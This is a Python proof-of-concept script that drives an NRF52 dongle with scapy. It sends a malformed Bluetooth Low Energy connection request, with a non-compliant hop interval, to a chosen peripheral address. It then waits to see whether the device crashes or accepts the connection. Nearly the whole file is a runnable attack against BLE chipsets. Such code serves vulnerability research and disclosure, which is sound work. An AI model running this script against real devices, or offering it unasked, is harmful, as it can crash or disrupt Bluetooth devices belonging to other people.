#!/usr/bin/python 
import os
import platform
import sys
from threading import Timer
from time import sleep

# libs
sys.path.insert(0, os.getcwd() + '/')  # If the user runs this on previous path
sys.path.insert(0, os.getcwd() + '/libs')  # If the user runs this on previous path
sys.path.insert(0, os.getcwd() + '/../libs')
sys.path.insert(0, os.getcwd() + '/../')
import colorama
from colorama import Fore
from drivers.NRF52_dongle import NRF52Dongle
from scapy.layers.bluetooth4LE import *

none_count = 0
slave_connected = False
send_version_ind = False
end_connection = False


def send(scapy_pkt):
    driver.send(scapy_pkt)


# Autoreset colors
colorama.init(autoreset=True)

# Get serial port from command line
if len(sys.argv) >= 2:
    serial_port = sys.argv[1]
elif platform.system() == 'Linux':
    serial_port = '/dev/ttyACM0'
elif platform.system() == 'Windows':
    serial_port = 'COM1'
else:
    print(Fore.RED + 'Platform not identified')
    sys.exit(0)

print(Fore.YELLOW + 'Serial port: ' + serial_port)

# Get advertiser_address from command line (peripheral addr)
if len(sys.argv) >= 3:
    advertiser_address = sys.argv[2].lower()
else:
    advertiser_address = 'f8:f0:05:f3:66:e0'.upper()

print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.upper())


def crash_timeout():
    print(Fore.RED + "No advertisement from " + advertiser_address.upper() +
          ' received\nThe device may have crashed!!!')
    exit(0)


def scan_timeout():
    if not slave_connected:
        scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
            ScanA=master_address,
            AdvA=advertiser_address)
        if conn_request.hop == 0:
            conn_request.hop = 1
        elif conn_request.hop == 1:
            conn_request.hop = 17
        else:
            conn_request.hop = 0

        send(scan_req)

    timeout_scan = Timer(2.0, scan_timeout)
    timeout_scan.daemon = True
    timeout_scan.start()


# Default master address
master_address = '5d:36:ac:90:0b:22'
access_address = 0x9a328370
# Open serial port of NRF52 Dongle
driver = NRF52Dongle(serial_port, '115200', logs_pcap=True,
                     pcap_filename='Microchip_and_others_non_compliant_connection.pcap')
# Send scan request
scan_req = BTLE() / BTLE_ADV(RxAdd=0) / BTLE_SCAN_REQ(
    ScanA=master_address,
    AdvA=advertiser_address)
send(scan_req)

# Start the scan timeout to resend packets
timeout_scan = Timer(2.0, scan_timeout)
timeout_scan.daemon = True
timeout_scan.start()

timeout = Timer(5.0, crash_timeout)
timeout.daemon = True
timeout.start()

already_connected = False

conn_request = BTLE() / BTLE_ADV(RxAdd=0, TxAdd=1) / BTLE_CONNECT_REQ(
    InitA=master_address,
    AdvA=advertiser_address,
    AA=access_address,  # Access address (any)
    crc_init=0x179a9c,  # CRC init (any)
    win_size=2,  # 2.5 of windows size (anchor connection window size)
    win_offset=2,  # 1.25ms windows offset (anchor connection point)
    interval=16,  # 20ms connection interval
    latency=0,  # Slave latency (any)
    timeout=50,  # Supervision timeout, 500ms
    # ---------------------28 Bytes until here--------------------------
    # Truncated when sending over the air, but the initiator will try the following:
    chM=0x1FFFFFFFFF,
    hop=0,  # any, including 0
    SCA=0,  # Clock tolerance
)

print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
while True:
    pkt = None
    # Receive packet from the NRF52 Dongle
    data = driver.raw_receive()
    if data:
        # Decode Bluetooth Low Energy Data
        pkt = BTLE(data)
        # if packet is incorrectly decoded, you may not be using the dongle
        if pkt is None:
            none_count += 1
            if none_count >= 4:
                print(Fore.RED + 'NRF52 Dongle not detected')
                sys.exit(0)
            continue
        # --------------- Process Link Layer Packets here ------------------------------------
        # Check if packet from advertised is received
        if BTLE_DATA in pkt:
            timeout.cancel()
            print(Fore.YELLOW + "Slave RX <--- " + pkt.summary()[7:] + Fore.RESET)
            print(Fore.RED + "Oops, peripheral accepted non-compliant connection hop interval of " \
                  + str(conn_request.hop) + Fore.RESET)
            if already_connected == False:
                already_connected = True
                driver.save_pcap()
        if pkt and (BTLE_SCAN_RSP in pkt) and pkt.AdvA == advertiser_address.lower():
            timeout.cancel()
            print(Fore.GREEN + advertiser_address.upper() + ': ' + pkt.summary()[7:] + ' Detected')

            # Yes, we're sending raw link layer messages in Python. Don't tell anyone as this is forbidden!!!
            send(conn_request)  # Send connection request to advertiser
            print(Fore.YELLOW + 'Malformed connection request was sent')

            # Start the timeout to detect crashes
            timeout = Timer(5.0, crash_timeout)
            timeout.daemon = True
            timeout.start()

    sleep(0.01)
